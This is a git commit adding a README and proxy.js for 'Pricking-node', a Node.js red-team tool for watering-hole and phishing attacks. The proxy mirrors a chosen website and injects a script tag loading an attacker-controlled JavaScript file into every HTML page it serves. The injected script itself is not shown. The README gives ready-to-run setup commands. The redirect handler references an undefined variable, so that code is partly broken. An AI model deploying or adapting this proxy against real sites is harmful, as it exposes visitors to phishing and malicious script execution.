4b686b73a3e3de4207a8d2e94c5a4a9c2c9c4b66
Rvn0xsy <rvn0xsy@gmail.com>
2021-12-29 17:03:04 +0800

    :collision: Nodejs版本

---
+++ README.md
@@ -0,0 +1,45 @@
+## Pricking-node
+
+
+[Pricking-node](https://github.com/Rvn0xsy/Pricking-node) 是一个基于Nodejs开发的自动化部署水坑和网页钓鱼的项目。
+
+想要了解更多可以阅读：
+
+- [红队技巧：基于反向代理的水坑攻击](https://payloads.online/archivers/2021-02-16/1)
+- [Pricking 项目（一） ：使用介绍](https://payloads.online/archivers/2021-02-18/1)
+- [Pricking 项目（二） ：JS模块开发](https://payloads.online/archivers/2021-02-18/2)
+
+:collision: :collision: :collision: 支持HTTPS/HTTP
+
+### 快速开始
+
+```bash
+$ npm install -g express
+$ npm install -g http-proxy-middleware
+$ git clone https://github.com/Rvn0xsy/Pricking-node.git
+$ cd Pricking-node
+$ node proxy.js
+```
+
+访问：http://localhost:3000/ 就可以看到反向代理的网站了。
+
+#### 默认值
+
+默认值：
+* 监听端口：3000
+* 静态文件目录：pricking-js-suite
+* 静态文件URI：/public
+* 反向代理目标：https://payloads.online
+
+#### 更改默认值
+
+```bash
+$ export HOST=https://www.example.com
+$ export PORT=4000
+$ export PUBLIC_URI=/public
+$ export PUBLIC_DIR=pricking-js-suite
+$ node proxy.js
+```
+
+访问：http://localhost:4000/ 就可以看到反向代理的网站了。
+
---
+++ proxy.js
@@ -0,0 +1,66 @@
+/*
+    https://github.com/Rvn0xsy/Pricking
+    //////////////////////////////////////////////////
+    $ npm install -g express
+    $ npm install -g http-proxy-middleware
+    $ node proxy.js
+    //////////////////////////////////////////////////
+    默认值：
+    * 监听端口：3000
+    * 静态文件目录：pricking-js-suite
+    * 静态文件URI：/public
+    * 反向代理目标：https://payloads.online
+*/
+
+const express = require('express');
+const { createProxyMiddleware,responseInterceptor } = require('http-proxy-middleware');
+
+// 不做处理的静态文件内容
+const staticTypes = ['image/png', 'image/jpg', 'image/jpeg', 'image/gif','image/x-icon','image/bmp','application/javascript','text/plain','audio/ogg','video/mp4','application/xml'];
+const saveTypes = ['application/pdf',]
+const app = express();
+const injectBody = '<script src="/public/static.js" type="module"></script>'
+
+// 默认端口 3000
+const gtargetHost = process.env.HOST == undefined?'https://payloads.online':process.env.HOST
+const glistenPort = process.env.PORT == undefined?3000:process.env.PORT
+const gpublicUri  = process.env.PUBLIC_URI == undefined?'/public':process.env.PUBLIC_URI
+const gpublicDir  = process.env.PUBLIC_DIR == undefined?'pricking-js-suite':process.env.PUBLIC_DIR
+
+// 静态文件目录
+app.use(gpublicUri, express.static(gpublicDir));
+
+app.use('/', createProxyMiddleware({
+    target: gtargetHost, 
+    changeOrigin: true,
+    selfHandleResponse: true,
+    onProxyReq(proxyReq, req, res) {  
+        // proxyReq.setHeader('Proxy-By', 'Pricking');
+    },
+    onProxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
+
+        // 处理跳转
+        if(res.statusCode == 302){
+            newLocation = res.getHeader("location").replace(targetHost,"")
+            if (newLocation.indexOf("/") != 0){
+                newLocation+="/"
+            }
+            res.setHeader("location",newLocation)
+        }
+
+        // 忽略静态资源
+        if (staticTypes.includes(proxyRes.headers['content-type'])) {
+            return responseBuffer;
+        }
+
+        // 对HTML文件进行注入
+        if(/text\/html/i.test(proxyRes.headers['content-type'])){
+            const response = responseBuffer.toString('utf8');
+            return response.replace('</body>', injectBody + '</body>');
+        }
+
+        return responseBuffer;
+    }),
+ }));
+
+app.listen(glistenPort);
